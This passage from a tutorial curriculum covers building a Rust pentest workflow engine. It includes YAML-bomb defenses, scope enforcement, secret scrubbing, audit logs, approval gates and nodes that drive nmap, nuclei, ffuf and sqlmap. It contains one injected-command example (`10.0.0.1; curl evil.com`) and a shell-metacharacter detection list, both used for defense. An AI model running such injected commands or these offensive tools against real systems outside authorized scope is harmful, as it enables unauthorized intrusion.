    # 9^5 = 59,049 strings from 5 lines. Add more levels and it's gigabytes.
    ```
    `serde_yaml` will expand all aliases before deserialization. Without mitigation, this allocates unbounded memory and OOM-kills the engine.
    Mitigations you MUST implement before deserializing any untrusted workflow:
    1. **Input size bound:** Reject any YAML file larger than 1 MB before parsing. No legitimate Achilles workflow will exceed this.
       ```rust
       const MAX_WORKFLOW_SIZE: usize = 1_024 * 1_024; // 1 MB

       fn parse_workflow(yaml: &str) -> Result<Workflow, ParseError> {
           if yaml.len() > MAX_WORKFLOW_SIZE {
               return Err(ParseError::InputTooLarge {
                   size: yaml.len(),
                   max: MAX_WORKFLOW_SIZE,
               });
           }
           // Proceed with deserialization
           let workflow: Workflow = serde_yaml::from_str(yaml)?;
           Ok(workflow)
       }
       ```
    2. **Post-parse structure depth check:** After deserialization, walk the `Workflow` struct and reject any structure deeper than 16 levels of nesting. No legitimate workflow uses deeply nested YAML:
       ```rust
       fn validate_structure_depth(workflow: &Workflow) -> Result<(), ParseError> {
           // Check for excessive node count (DoS via thousands of nodes)
           if workflow.nodes.len() > 500 {
               return Err(ParseError::TooManyNodes {
                   count: workflow.nodes.len(),
                   max: 500,
               });
           }
           Ok(())
       }
       ```
    3. **Deliberate break — prove the bomb is defused:** Create the billion-laughs YAML file above. Feed it to your parser:
       - Without the size limit: observe memory usage explode (use `/usr/bin/time -v` to measure peak RSS)
       - With the size limit: observe immediate rejection before any parsing occurs
       - This is the exact attack described in §7.3 (I-10). You must be able to demonstrate that it fails safely.
  - *Lesson: `serde_yaml` does the heavy lifting. But YOUR structs define the schema. `Option<T>` = optional. `T` = required. Serde enforces this at parse time. But serde does NOT protect you from billion-laughs — that's your responsibility.*

- [ ] Day 14 — DAG builder and validation
  - `fn build_dag(workflow: &Workflow) -> Result<ExecutionGraph, ValidationError>`
  - Use `petgraph::DiGraph`. Implement:
    - **Cycle detection:** `petgraph::algo::is_cyclic_directed` — reject circular dependencies
    - **Missing dependency:** node A depends on B, but B doesn't exist — reject
    - **Orphan detection:** warn if node is disconnected from the graph
  - *Lesson: validation before execution. Achilles never discovers a malformed workflow halfway through. This is §5.1.*

### Day 14b — Feed the engine poison

- [ ] Write 5 malformed workflow files:
  1. Circular dependency: A → B → A
  2. Missing required field (no `tool` or `type`)
  3. Reference to non-existent node in `depends_on`
  4. Duplicate node names
  5. A valid workflow (prove you don't reject everything)
  - All 4 bad workflows rejected **before any command executes**, with clear specific errors. The valid one passes.
  - *Lesson: the security review (§7.3) starts here. A malicious community workflow with a circular dependency designed to infinite-loop your engine is caught at validation.*

- [ ] Day 15 — State management and checkpointing
  - Add `rusqlite`. Design the state schema:
    - `workflow_runs` table: run_id, workflow_name, status, started_at, completed_at
    - `node_states` table: run_id, node_name, status, started_at, completed_at, output_json, error_message
  - **CRITICAL: `rusqlite` is a synchronous C library wrapper.** Every call to `conn.execute()`, `conn.query_row()`, etc. blocks the calling thread. If you call these from an async context, you block the Tokio worker thread — and every other task scheduled on that thread stalls silently (the same problem Day 10 warned about for `std::process::Command`). All SQLite interactions MUST be wrapped in `tokio::task::spawn_blocking`:
    ```rust
    use tokio::task;

    async fn save_checkpoint(db: Arc<Mutex<Connection>>, state: NodeState) -> Result<()> {
        task::spawn_blocking(move || {
            let conn = db.lock().unwrap();
            conn.execute(
                "INSERT OR REPLACE INTO node_states (run_id, node_name, status, output_json)
                 VALUES (?1, ?2, ?3, ?4)",
                params![state.run_id, state.node_name, state.status, state.output_json],
            )?;
            Ok(())
        }).await?
    }
    ```
    `spawn_blocking` moves the synchronous work to a dedicated thread pool that does not share threads with the async executor. The `.await` yields the async task until the blocking work completes. This is the standard pattern for all synchronous I/O in async Rust — database calls, filesystem operations, CPU-heavy computation.
  - Implement: save checkpoint after each node completes
  - **Checkpoint state machine:** Every node has one of 5 states: `PENDING`, `RUNNING`, `COMPLETED`, `FAILED`, `SKIPPED`.
    ```rust
    enum NodeState {
        Pending,
        Running,    // Set when execution begins
        Completed,  // Set after successful execution + output saved
        Failed,     // Set on error
        Skipped,    // Set when upstream failed or operator skipped
    }
    ```
    **On crash recovery:** A node in `RUNNING` state is treated as `FAILED`, not re-executed automatically. The engine cannot know if the node partially executed (e.g., sqlmap may have sent exploitation payloads). The operator must use `--force-rerun-node <name>` to explicitly restart a specific node.
    Store the state in the `node_states` table. On resume: skip `COMPLETED`, re-evaluate `FAILED` according to error strategy, require operator decision for `RUNNING`.
  - Implement: resume from run_id — skip completed nodes, resume from first non-completed
  - Test: run 3-node pipeline, kill after node 2, resume — node 3 runs using node 2's saved output
  - *Lesson: pentests take hours. Losing progress to a laptop close is unacceptable. Checkpointing is a requirement, not a feature. §5.4.*

- [ ] Day 16 — The execution loop
  - Write: `fn execute_workflow(workflow: &Workflow, db: &Connection) -> Result<WorkflowResult, EngineError>`
  - The function: parses YAML → builds DAG → walks topological order → resolves inputs → runs tools → transforms output → validates schema → checkpoints to SQLite → handles errors (retry/skip/abort)
  - **Global cancellation with `tokio::signal`:** If an operator hits Ctrl+C (SIGINT) during a 4-hour scan and you don't handle it, the engine dies instantly. Your SQLite state is not checkpointed (last node's output is lost), and every spawned child process (nmap, nuclei, ffuf) becomes an orphaned zombie running indefinitely in the background, potentially scanning targets without oversight.
    Implement a global shutdown signal:
    ```rust
    use tokio::signal;
    use tokio_util::sync::CancellationToken;

    let cancel_token = CancellationToken::new();
    let token_clone = cancel_token.clone();

    // Spawn a task that waits for Ctrl+C
    tokio::spawn(async move {
        signal::ctrl_c().await.expect("failed to listen for Ctrl+C");
        eprintln!("\n[!] SIGINT received — initiating graceful shutdown...");
        token_clone.cancel();
    });

    // In the execution loop, check the token before each node:
    for node in topological_order {
        if cancel_token.is_cancelled() {
            // 1. Send SIGTERM to all running child processes
            for child in running_children.iter_mut() {
                let _ = child.start_kill();  // SIGTERM
            }
            // 2. Wait briefly for graceful termination
            tokio::time::sleep(Duration::from_secs(3)).await;
            // 3. SIGKILL any survivors
            for child in running_children.iter_mut() {
                let _ = child.kill().await;  // SIGKILL
            }
            // 4. Write final checkpoint
            save_checkpoint(&db, &current_state).await?;
            return Err(EngineError::Cancelled);
        }
        execute_node(node, &cancel_token).await?;
    }
    ```
    The `CancellationToken` is passed to every node execution. Long-running node executions check `cancel_token.is_cancelled()` between subprocess calls and abort early if set. This ensures cleanup happens at every level — engine, node, and subprocess.
  - Run the §8.2 bug bounty workflow through your engine. End to end.
  - **Test the shutdown:** start a long workflow, press Ctrl+C mid-execution. Verify: (1) child processes are killed (check `ps aux | grep nmap`), (2) SQLite state shows partial completion, (3) `achilles resume` picks up from the last checkpoint.
  - *Lesson: you just built a workflow engine from scratch. No framework. You understand every line. This is the Phase 1 deliverable (§10.2). The core is done.*

---

## Phase 5: CLI Design (Days 17-18)
*A tool with a terrible interface won't be used. The CLI is the product.*

- [ ] Day 17 — `clap` for CLI argument parsing
  - Add `clap` v4 (derive API). Implement:
    - `achilles run <workflow.yaml>` — execute a workflow
    - `achilles validate <workflow.yaml>` — parse + validate, no execution
    - `achilles status <run-id>` — show workflow state from SQLite
    - `achilles resume <run-id>` — resume interrupted run
    - `achilles list` — list workflow files in current directory
  - Global flags: `--verbose`, `--quiet`, `--json`
  - **Cross-platform paths:** use the `dirs` crate for home directory resolution (`dirs::home_dir()`) instead of hardcoding `~/.achilles/`. Use `std::path::PathBuf` everywhere — never string path concatenation.
  - *Lesson: `clap`'s derive API turns Rust structs into CLI parsers. Same principle as serde: type definitions ARE the specification. §8.1.*

### Day 17b — Static Security Review: The Pre-Flight Gate

Day 17 gave you `achilles validate`. Right now it checks schema and DAG structure. But it does NOT check security properties. The architecture document (§7.3) requires a static security review before any workflow executes. This day builds the pre-flight function that enforces the two most critical capability gates.

- [ ] Write `fn security_review(workflow: &Workflow, dag: &ExecutionGraph) -> Result<SecurityReport, SecurityViolation>`:

  **Gate 1: WASM Credential Capability Verification**

  Any `custom_script` node that declares `credentials: read_full` can read plaintext extracted passwords. This is a high-risk capability that requires an approval node upstream in the DAG (§7.5). The pre-flight function must mathematically verify this:

  ```rust
  fn verify_credential_gates(
      workflow: &Workflow,
      dag: &ExecutionGraph,
  ) -> Result<(), SecurityViolation> {
      for node in &workflow.nodes {
          // Find nodes requesting read_full credential access
          if node.node_type == "custom_script" {
              if let Some(caps) = &node.capabilities {
                  if caps.credentials == CredentialCapability::ReadFull {
                      // Walk the DAG backwards from this node
                      // There MUST be an approval node on EVERY path
                      // from any root to this node
                      let has_approval_gate = dag_has_upstream_approval(
                          dag,
                          &node.name,
                      );
                      if !has_approval_gate {
                          return Err(SecurityViolation::UnguardedCredentialAccess {
                              node: node.name.clone(),
                              required: "An approval node must exist on every \
                                         path leading to this node.".into(),
                          });
                      }
                  }
              }
          }
      }
      Ok(())
  }

  /// Walk backwards from `target_node` through all predecessor paths.
  /// Return true only if EVERY path from a root node to `target_node`
  /// passes through at least one approval node.
  fn dag_has_upstream_approval(
      dag: &ExecutionGraph,
      target_node: &str,
  ) -> bool {
      // BFS/DFS backwards from target_node
      // For each root node reachable by walking predecessors:
      //   trace path root -> target_node
      //   if ANY path does NOT contain an approval node, return false
      // If ALL paths contain at least one approval node, return true
      // ...
  }
  ```

  **Gate 2: Shell Metacharacter Detection in Node Arguments**

  Scan every node's static arguments for shell metacharacters. If someone writes `target: "10.0.0.1; curl evil.com"` in the workflow YAML, catch it before execution:

  ```rust
  const SHELL_METACHARACTERS: &[char] = &[';', '|', '&', '`', '$', '(', ')', '{', '}'];

  fn detect_shell_injection(workflow: &Workflow) -> Vec<SecurityWarning> {
      let mut warnings = Vec::new();
      for node in &workflow.nodes {
          if let Some(config) = &node.config {
              for (key, value) in config.iter() {
                  if let Some(s) = value.as_str() {
                      for ch in SHELL_METACHARACTERS {
                          if s.contains(*ch) {
                              warnings.push(SecurityWarning::ShellMetacharacter {
                                  node: node.name.clone(),
                                  field: key.clone(),
                                  character: *ch,
                              });
                          }
                      }
                  }
              }
          }
      }
      warnings
  }
  ```

- [ ] Integrate into the CLI:
  - `achilles validate` now runs: (1) schema validation, (2) DAG validation, (3) `security_review()`
  - `achilles run` calls `security_review()` before any node executes. If it returns `Err`, the engine prints the violation in red and aborts. No `--force` flag to bypass.
  - Output format:
    ```
    $ achilles validate community_workflow.yaml
    ✓ Schema valid
    ✓ DAG valid (12 nodes, 0 cycles)
    ✗ SECURITY: Node "credential_analysis" requests credentials: read_full
      but has no upstream approval node.
      Fix: Add an approval node between "sqli_exploit" and "credential_analysis".
    ⚠ WARNING: Node "recon" field "target" contains shell metacharacter ';'
    RESULT: REJECTED (1 security violation, 1 warning)
    ```
  - *Lesson: this is §7.3 brought to life. Static analysis catches security violations before any tool runs. The engine is the gatekeeper — community workflows must pass the gate. No exceptions.*

- [ ] Day 18 — Error UX and output formatting
  - Add `console` (colors) and `indicatif` (progress bars)
  - Show live progress: `[■■■□□] 3/5 nodes complete | Running: nuclei | Elapsed: 2m 34s`
  - Show errors in red with context: `ERROR: Circular dependency detected → node "nmap" depends on "nuclei" → node "nuclei" depends on "nmap" → Fix: remove one dependency.`
  - Every error human-readable — never a raw Rust panic.

### Day 18b — Eat your own cooking

- [ ] Pretend you've never seen your tool:
  - `achilles` with no arguments — is the help clear?
  - `achilles run nonexistent.yaml` — is the error helpful?
  - `achilles validate` with invalid workflow — does it say WHICH dependency is missing?
  - `achilles status` with invalid run ID — "not found" or crash?
  - Fix every confusing message. Never `thread 'main' panicked at...`
  - *Lesson: if this were a client deliverable, the error messages reflect your competence. Ship polished tools.*

---

## Phase 6: Security & Scope Enforcement (Days 19-21)
*A pentesting tool that can be accidentally or maliciously pointed at unauthorized targets is worse than no tool at all.*

- [ ] Day 19 — Build the scope enforcer
  - Define a `Scope` struct matching §8.2:
    ```rust
    struct Scope {
        domains: ScopeRules,   // include: ["*.target.com"], exclude: ["mail.target.com"]
        ips: ScopeRules,       // include: ["10.0.0.0/24"]
        ports: ScopeRules,     // exclude: [445, 135, 139]
    }
    ```
  - Implement `fn is_in_scope(target: &Target, scope: &Scope) -> Result<bool, ScopeError>`:
    - Domain matching: `api.target.com` matches `*.target.com`. `mail.target.com` is excluded even though it matches the wildcard.
    - IP matching: `10.0.0.5` matches `10.0.0.0/24`. Use the `ipnetwork` crate for CIDR parsing.
    - Port matching: port `445` is excluded by the scope.
  - **CRITICAL: IPv4-mapped IPv6 normalization.** Before any CIDR check, you MUST normalize IPv4-mapped IPv6 addresses. The address `::ffff:10.0.0.5` is mathematically equivalent to `10.0.0.5`, but if your scope rules only contain IPv4 CIDRs (`10.0.0.0/24`), the `ipnetwork` crate will NOT match `::ffff:10.0.0.5` against `10.0.0.0/24` — it treats them as different address families. An attacker (or a tool that returns dual-stack addresses) can bypass your entire scope by feeding IPv6-encapsulated IPv4 addresses.
    Normalize before checking:
    ```rust
    use std::net::IpAddr;

    /// Strip IPv4-mapped IPv6 encapsulation.
    /// ::ffff:10.0.0.5 → 10.0.0.5
    /// Pure IPv6 addresses pass through unchanged.
    fn normalize_ip(ip: IpAddr) -> IpAddr {
        match ip {
            IpAddr::V6(v6) => {
                // Check for IPv4-mapped IPv6: ::ffff:x.x.x.x
                if let Some(v4) = v6.to_ipv4_mapped() {
                    IpAddr::V4(v4)
                } else {
                    IpAddr::V6(v6)
                }
            }
            v4 => v4,
        }
    }

    fn is_in_scope(target: &Target, scope: &Scope) -> Result<bool, ScopeError> {
        match target {
            Target::IP(ip) => {
                let normalized = normalize_ip(*ip);  // Always normalize first
                scope.ips.contains(normalized)
            }
            // ...
        }
    }
    ```
    Test: `is_in_scope("::ffff:10.0.0.5")` must return the same result as `is_in_scope("10.0.0.5")` for scope `10.0.0.0/24`. If it doesn't, your scope enforcer has a bypass vulnerability.
  - Test edge cases: subdomain of allowed domain (allowed), excluded subdomain of allowed wildcard (denied), IP inside CIDR (allowed), IP just outside CIDR (denied), domain that resolves to in-scope IP but domain not in scope (document your decision and justify it), **IPv4-mapped IPv6 address against IPv4-only scope rules (must match)**.
  - *Lesson: scope enforcement is not a feature. It is a legal requirement. If your tool scans outside authorized scope, criminal charges under CFAA are possible. Zero tolerance. This is §3 (I-04).*

- [ ] Day 20 — Engine-level scope integration + secrets management
  - Integrate scope checking at three points (§5.7):
    1. **Pre-workflow:** validate all targets before any node runs
    2. **Pre-node:** verify input targets before each tool executes
    3. **Post-node:** verify output targets after each tool completes (catches redirects to out-of-scope hosts)
  - If any check fails: **abort immediately**. No skip. No prompt. Stop.
  - Test: workflow where httpx follows redirect to out-of-scope domain — caught at post-node check.
  - **Secrets vault:** Add the `ring` crate for AES-256-GCM encryption.
    - `achilles secrets set <key> <value>` — encrypt and store in `~/.achilles/vault.enc`
    - `achilles secrets list` — list key names (never values)
    - `${secrets.SHODAN_KEY}` resolution at runtime
  - *Lesson: defense in depth. Pre-node catches intentional violations. Post-node catches unintentional ones (redirects, DNS rebinding). Both required. §5.7.*

### Day 20b — Prove the secrets never leak

- [ ] Critical verification:
  - Run a workflow that uses a secret. Search **all** stdout, stderr, log output, SQLite state for the secret's plaintext. It must appear **nowhere**.
  - Write a log scrubber using the `aho-corasick` crate — NOT naive string replacement:
    ```rust
    use aho_corasick::AhoCorasick;

    let secrets = vec!["sk-abc123...", "ghp_xyz789..."];
    let redacted = vec!["[REDACTED:SHODAN_KEY]", "[REDACTED:GITHUB_TOKEN]"];
    let ac = AhoCorasick::new(&secrets).unwrap();

    let scrubbed = ac.replace_all(&raw_output, &redacted);
    // Single O(n) pass over the output. All secrets matched simultaneously.
    ```
    Naive `string.replace()` with N secrets is O(n×N) and will stall on 100 MB+ nmap outputs. Aho-Corasick builds a finite automaton that matches all patterns in one pass.
  - **Credential scrubber corruption prevention:** Do NOT add short extracted passwords (< 8 characters) to the global text scrubber. A password like `"admin"` or `"123"` will match innocent strings throughout JSON state — node names, port numbers, IP octets, status codes. Instead, strip `plaintext_password` from `Credential` objects before serialization. Only passwords ≥ 8 characters are safe for global find-replace.
  - Verify: `ps aux` while a tool is running — is the secret visible in command-line arguments? If yes, fix by using environment variable injection instead.
  - *Lesson: secrets management is not about encryption — it's about controlling every place the plaintext can appear. §7.4 and §3 (I-08).*

- [ ] Day 21 — Audit logging with hash chain
  - Append-only log: `~/.achilles/audit/<run-id>.jsonl`
  - Every action logged: workflow start, node start, node complete, scope check pass/fail, secret accessed, workflow complete
  - Hash chain: `entry_hash = sha256(previous_hash + current_entry_json)`
  - Each line: sequence_number, timestamp, event, previous_hash, entry_hash
  - Implement `achilles audit verify <run-id>` — recompute every hash, verify chain unbroken
  - Test: manually edit one line of the audit log. Run verify. It fails and identifies the tampered entry.
  - *Lesson: "prove you didn't scan out of scope" — the verified hash chain is your evidence. Not optional for professional pentesting. §7.4 and §3 (I-11).*

---

## Phase 7: Node Library (Days 22-27)
*Each node is the bridge between a real, messy security tool and the clean ADC world inside Achilles.*

> **Before Day 22: Understand what the tools actually do at the network level** *(30 minutes — read and observe, minimal code)*
>
> You are about to build production nodes for tools that send real packets over real networks. You must understand what those packets are.
>
> - **TCP 3-way handshake:** SYN → SYN-ACK → ACK. An nmap SYN scan (`-sS`) sends SYN and reads the response without completing the handshake. A connect scan (`-sT`) completes it. Know the difference and why SYN requires root.
> - **Service detection:** `-sV` sends additional probes after finding an open port to fingerprint the service. It sends data and reads the response banner. This is more intrusive than a port scan.
> - **DNS resolution:** `subfinder` queries DNS servers and certificate transparency logs. It does not touch the target directly. `httpx` resolves hostnames and sends HTTP requests. Know which tools are passive vs. active.
> - **HTTP at the wire level:** An HTTP request is a text message: `GET /path HTTP/1.1\r\nHost: target.com\r\n\r\n`. A response includes status code, headers, and body.
>
> **Exercise:** Run `sudo tcpdump -i any -n host <your-lab-target>` in one terminal. In another, run `nmap -sS -p 80 <target>`. Watch the SYN packets. Then run `nmap -sV -p 80 <target>`. Watch the additional probes after the port is found open. This 15 minutes of observation is worth more than any tutorial.
>
> Use your lab targets from Phase 0b for all node testing in this phase. Do NOT rely solely on `scanme.nmap.org`. Set up a HackTheBox or TryHackMe machine, or a local Vulnhub/Docker environment.

> **Understand the Node trait** *(10 min read)*
>
> Every node implements the same interface (§6.1):
> ```
> input_schema()   → What ADC types does this node consume?
> output_schema()  → What ADC types does this node produce?
> config_schema()  → What configuration options does it accept?
> validate()       → Is the config valid? (before execution)
> execute()        → Run the tool, transform output, return ADC objects
> ```
>
> Define a `Node` trait in Rust. Every tool in this phase implements it.

- [ ] Day 22 — Subfinder node + httpx node (production quality)
  - Wrap your existing transformers (Day 9) in the `Node` trait
  - Subfinder: input from scope domains, run `subfinder -d <domain> -silent`, transform, scope-check every output
  - Httpx: input `Vec<Host>`, pipe hostnames to `httpx -json`, handle non-HTTP targets, redirects
  - Both: proper timeout, error handling, config validation
  - *Lesson: the transformer is the contract enforcer. Raw tool output is untrusted input.*

- [ ] Day 23 — Nmap node (full production version)
  - Wrap Day 8 transformer in Node trait
  - Config-to-CLI mapping: `scan_type: syn` → `-sS`, `ports: "top-1000"` → `--top-ports 1000`
  - Version detection: `nmap --version` → parse → check against `supported_versions()`
  - Timeout enforcement: kill process if exceeded
  - Edge case: all ports filtered (output has `state="filtered"`) — handle gracefully
  - **SNI/CDN handling for httpx/nuclei:** When passing pre-resolved IPs (§5.7.1), TLS handshakes against CDN-hosted targets (Cloudflare, Akamai) fail because the SNI header is missing. For Day 24 (nuclei) and httpx, pass both hostname and resolved IP:
    ```rust
    // httpx: force DNS resolution to our pre-resolved IP
    Command::new("httpx")
        .arg("-u").arg(format!("https://{}", hostname))
        .arg("-resolve").arg(format!("{}:{}", hostname, resolved_ip))
        .stdin(Stdio::null())
    // Same pattern for nuclei
    ```
    Without `-resolve`, httpx queries DNS independently, re-introducing the TOCTOU vulnerability you fixed in §5.7.1 and breaking on Cloudflare targets that require the correct SNI.
  - *Lesson: nmap is the most complex node. If your transformer survives nmap, it survives anything.*

- [ ] Day 24 — Nuclei node
  - Input: `Vec<URL>` from httpx. Write URLs to a `NamedTempFile` (from the `tempfile` crate — auto-deleted on drop via RAII), run `nuclei -l <tempfile> -jsonl`
  - **Temp file strategy:** Use `tempfile::NamedTempFile` for target lists. When the `NamedTempFile` goes out of scope, the file is automatically deleted. No manual cleanup. No leaked files on crash. For files needed in post-mortem debugging, write to `~/.achilles/runs/<run-id>/tmp/<node-name>/` instead (cleaned on successful completion, preserved on failure).
  - Map nuclei JSON → `Finding`: `info.name` → title, `info.severity` → severity enum, `info.classification.cve-id` → cve, `matched-at` → url, `request` + `response` → evidence
  - Handle Nuclei v2 (`template-id` hyphen) vs v3 (`template_id` underscore) — detect version, use correct field
  - *Lesson: tool authors change output format between versions. Transformers must be versioned (§4.4). The v2/v3 difference has broken real pipelines.*

- [ ] Day 25 — Ffuf node
  - Input: `Vec<URL>` (base URLs). Config: wordlist, threads, filters
  - Run `ffuf -u <url>/FUZZ -w <wordlist> -of json`, parse JSON → `Vec<URL>`
  - **Temp file strategy:** Same as Day 24. Write target URL list and any dynamic wordlists to `NamedTempFile`. Static wordlists (from `~/.achilles/wordlists/`) are read-only — do not copy to tempfile.
  - **Wordlist resolution** (§8.3): search `~/.achilles/wordlists/`, `/usr/share/wordlists/`, `./wordlists/` — use `dirs` crate for cross-platform home directory
  - Test: ffuf against WAF target (lots of 403s). Does filter config work?
  - *Lesson: wordlist resolution is portability. Kali workflow must work on Parrot, Docker, any system. No hardcoded paths.*

### Day 25b — Cross-node integration test

- [ ] Run the full DAG end-to-end:
  ```
  subfinder → httpx → [nmap, nuclei, ffuf] (parallel) → merge results
  ```
  - All data through ADC types, all outputs schema-validated, all targets scope-checked, all states checkpointed
  - Time the full run. Compare to running tools manually.
  - If anything breaks, fix it here.
  - *Lesson: integration tests prove nodes work together. Most bugs live in transitions between nodes, not inside them. §10.4.*

- [ ] Day 26 — Error recovery and retry logic
  - Implement per-node error strategies (§5.5):
    - `retry`: up to N times with exponential backoff
    - `skip`: mark skipped, continue without output
    - `abort`: stop entire workflow
    - `fallback`: use cached result from SQLite
  - **Retry safety distinction (§5.5):** NOT all nodes are safe to retry:
    | Node type | `safe_to_retry` default | Reasoning |
    |---|---|---|
    | Reconnaissance (subfinder, httpx) | `true` | Passive or low-impact |
    | Scanning (nmap, nuclei) | `true` for infrastructure errors only | Re-scan is safe. But if nuclei exit code indicates WAF block, do NOT retry — treat as abort |
    | Exploitation (sqlmap) | `false` | Re-running exploitation against a target that triggered a WAF will escalate detection. Operator must explicitly use `--force-rerun-node` |
    | Logic/merge | `true` | No external side effects |
    Implement: check `safe_to_retry` before executing a retry. If `false` and failure is not an infrastructure error (timeout, OOM, tool-not-found), treat as `abort` regardless of declared strategy.
  - Test each with mock failures
  - *Lesson: in a 6-hour workflow, one node failure shouldn't waste the entire run. But retrying sqlmap against a WAF-blocked target will get you flagged in the client's SOC.*

### Day 26b — Sqlmap node

- [ ] Implement the highest-risk node in the library:
  - Input: `Vec<Finding>` (SQLi candidates from nuclei) OR `Vec<URL>` (URLs with injectable parameters)
  - Config: `level` (1-5), `risk` (1-3), `technique` (BEUSTQ), `batch: true`
  - Transformer: parse sqlmap stdout (regex-based) for injectable parameters, techniques, payloads
  - **Critical constraint:** The engine must **warn at validation time** if a sqlmap node has no approval node upstream. Sqlmap performs active exploitation — it must never run without explicit human confirmation.
  - Config flag `dump: false` by default — database dumping requires a separate approval node
  - Test: run against a deliberately vulnerable target (DVWA in your lab). Verify findings are correctly typed as `Finding` with evidence.
  - *Lesson: sqlmap is why the approval node exists. Automated SQL injection exploitation without human review is negligent. The engine enforces the gate. This is §3 (I-07) and §6.2 (Sqlmap Node).*

### Day 26c — The Expression Evaluator: Rhai Embedded Scripting

Day 27 asks you to implement logic nodes — conditional, split, transform — that evaluate expressions like `input.findings.any(|f| f.severity == "critical")`. But you don't have an expression evaluator yet. Without one, you'll be tempted to either hardcode conditions (useless) or use `eval()` (dangerous). This day builds the evaluator correctly.

**Why Rhai (and not the alternatives):**
- A **custom DSL** built with `nom` would take 3,000-5,000 lines and months to reach production quality. Error messages alone would take weeks. This is a project-killing yak shave for a solo developer.
- **CEL (Common Expression Language)** is technically ideal — Google designed it for exactly this use case. But the Rust `cel-interpreter` crate is immature with limited adoption. Betting on it is risky.
- **Rhai** is purpose-built for embedding in Rust. It provides the AST, type system, and sandboxing. You write ~500 lines of integration, not ~5,000 lines of language design. The architecture document specifies this choice in §6.3.1.

- [ ] Exercises:
  - Add the `rhai` crate to your project: `cargo add rhai`
  - Create a sandboxed Rhai engine — this is the critical step:
    ```rust
    let mut engine = Engine::new();

    // Safety limits — prevent resource exhaustion
    engine.set_max_expr_depths(64, 32);    // Max expression nesting
    engine.set_max_string_size(10_000);     // Max string length
    engine.set_max_array_size(100_000);     // Max array elements
    engine.set_max_operations(1_000_000);   // Max computation steps
    engine.disable_symbol("eval");          // No dynamic evaluation
    ```
  - Register your ADC types with Rhai:
    ```rust
    engine.register_type_with_name::<Finding>("Finding");
    engine.register_get("severity", |f: &mut Finding| f.severity.to_string());
    engine.register_get("title", |f: &mut Finding| f.title.clone());
    engine.register_get("cve", |f: &mut Finding| f.cve.clone());
    // ... register all fields you want expressions to access
    ```
  - Register collection functions:
    ```rust
    engine.register_fn("any", |arr: &mut Vec<Finding>, filter: FnPtr| -> bool { ... });
    engine.register_fn("all", |arr: &mut Vec<Finding>, filter: FnPtr| -> bool { ... });
    engine.register_fn("count", |arr: &mut Vec<Finding>| -> i64 { arr.len() as i64 });
    engine.register_fn("filter", |arr: &mut Vec<Finding>, filter: FnPtr| -> Vec<Finding> { ... });
    ```
  - Test the evaluator against real data:
    - Create a `Vec<Finding>` with 5 findings of mixed severity
    - Evaluate: `findings.any(|f| f.severity == "critical")` → should return `true` if any critical finding exists
    - Evaluate: `findings.filter(|f| f.severity == "high" || f.severity == "critical").count()` → should return the correct count
    - Evaluate: `findings.all(|f| f.severity != "info")` → test against your data

**Deliberate break: Prove the sandbox holds**

- [ ] Attempt 4 unsafe operations from within a Rhai script:
  1. Try to call `std::process::Command` or any system function → Rhai has no access to Rust's stdlib. It fails.
  2. Try to read a file with any I/O function → Rhai's default engine has no filesystem access. It fails.
  3. Try to use `eval("malicious code")` → you disabled `eval` above. It fails.
  4. Try to create an infinite loop: `loop { }` → the `max_operations` limit kills it after 1,000,000 steps.
  - All 4 must fail with clear errors. None should crash Achilles.
  - *Lesson: Rhai is not a general scripting language in Achilles — it is a typed query language over ADC objects. The engine is responsible for what Rhai can see. If Rhai can see a secret, it can leak a secret. Control the scope. The engine registers only the fields it decides to expose — nothing more. This is the principle of least privilege applied to expression evaluation (§6.3.1).*

- [ ] Day 27 — Logic nodes
  - Implement 4 logic nodes that don't invoke external tools:
    - **Conditional:** evaluate expression against ADC objects, route to `if_true` or `if_false` branch
    - **Merge:** aggregate outputs from parallel branches (`wait_all` strategy)
    - **Split:** route objects to different branches based on a field value (e.g., split findings by severity)
    - **Data Transform:** convert between ADC types using iterator methods
  - Expression language: safe subset — field access, comparisons, `any`, `all`, `count`, `filter`. No arbitrary code execution.
  - *Lesson: logic nodes are what make Achilles a workflow engine rather than just a tool runner. Conditionals enable "only exploit if critical findings exist." Splits enable "handle critical and low-priority differently." This is §6.3.*

---

## Phase 8: Approval Node & Notifications (Days 28-29)
*Before exploitation runs, a human must review and approve. This is not optional — it's a legal and ethical gate.*

- [ ] Day 28 — Build the approval node
  - New node type: `type: approval`
  - When reached: pause workflow, save state, print terminal summary (findings by severity, what the next node will do, scope in play)
  - Accept: `APPROVE`, `REJECT`, or `APPROVE_PARTIAL` (only specific findings)
  - `APPROVE` → resume. `REJECT` → abort with "rejected by operator". `APPROVE_PARTIAL` → filter findings, pass only approved ones downstream.
  - `achilles approve <run-id> <token>` as separate CLI command (approve from different terminal). The `<token>` is a one-time approval token generated when the approval node activates — it prevents unauthorized approvals.
  - **Timeout model:** Default is `AWAITING_APPROVAL` with **no timeout** (hibernate indefinitely). Engagements run overnight and across time zones — a 2-hour auto-reject breaks any workflow started before the operator leaves. Optional `auto_reject_after` field for operators who want a deadline:
    ```yaml
    - name: exploit_approval
      type: approval
      config:
        auto_reject_after: 24h    # Optional — omit for indefinite hibernate
    ```
  - *Lesson: the approval node prevents automated exploitation without review. Sqlmap with `--dump` can exfiltrate a database. Never without consent. §3 (I-07).*

- [ ] Day 29 — Outbound notifications
  - **Outbound only — no inbound webhooks.** Achilles is a local CLI. Receiving Slack callbacks requires a reverse tunnel (ngrok, etc.) — which is an attack surface and an unreliable dependency for a security tool. The correct model:
    1. Achilles sends an outbound webhook to Slack/Discord with: workflow name, findings summary, the approval token, and the exact CLI command to run (`achilles approve <run-id> <token>`)
    2. The operator reads the Slack message, opens any terminal, runs the approve command
    3. No reverse tunnel. No exposed port. The token authenticates the decision.
  - Multi-channel: Slack + CLI terminal simultaneously. First response wins.
  - Test failure modes:
    - Webhook URL wrong (404) — does workflow hang? (No — CLI still works)
    - Webhook server down — same
    - Operator never responds — default hibernate (or `auto_reject_after` if configured)
  - *Lesson: default-hibernate is a practical security principle. System can't reach the human → it waits. Never assumes consent. §5.6.*

---

## Phase 9: Hacker Templates & Polish (Days 30-33)
*If a stranger can't run your tool in 10 minutes, the tool doesn't work.*

- [ ] Day 30 — Bug Bounty Recon template
  - Complete YAML: subfinder → httpx → [nmap, nuclei, ffuf] → approval → report
  - Scope placeholder for operator to fill in. Sensible defaults (rate limits, timeouts, threads).
  - YAML comments explaining every node (this is why §8.2 chose YAML).
  - Test against a real authorized lab target.

- [ ] Day 31 — Web App Assessment + API Security templates
  - Web App: httpx → nuclei (OWASP templates) → ffuf → approval → sqlmap → report
  - API Security: URL input → nuclei (API templates) → ffuf (params) → report
  - Different scope configs, different node chains, different approval boundaries.

- [ ] Day 32 — Report generation
